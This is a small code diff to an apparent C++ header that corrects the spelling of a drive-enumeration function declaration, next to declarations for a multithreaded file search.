@@ -14,7 +14,7 @@ namespace filesystem {
 
 	typedef TAILQ_HEAD(drive_list_, drive_info_) DRIVE_LIST, * PDRIVE_LIST;
 
-	INT EnumirateDrives(PDRIVE_LIST DriveList);
+	INT EnumerateDrives(PDRIVE_LIST DriveList);
 	VOID SearchFiles(std::wstring StartDirectory, INT ThreadPoolID);
 	DWORD WINAPI StartLocalSearch(PVOID pArg);
 
